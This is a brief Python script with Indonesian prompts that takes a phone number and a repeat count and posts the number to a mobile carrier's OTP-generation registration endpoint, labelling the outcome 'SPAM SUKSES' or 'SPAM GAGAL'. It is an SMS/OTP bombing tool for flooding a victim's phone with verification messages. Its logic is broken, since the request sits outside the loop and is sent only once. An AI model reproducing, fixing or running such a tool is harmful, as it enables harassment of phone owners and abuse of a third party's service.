import requests, sys, time



r = requests.Session()

no = input("MASUKAN NOMOR: ")
jm = input("MASUKAN JUMLAH: ")

url = "https://registrasi.tri.co.id/daftar/generateOTP"


data = {"msisdn":no}

respon = r.post(url, data=data).text

for c in range(int(jm)):
    if "200" in respon:
        print ("SPAM SUKSES")
    else:
        print ("SPAM GAGAL")
        time.sleep(1)
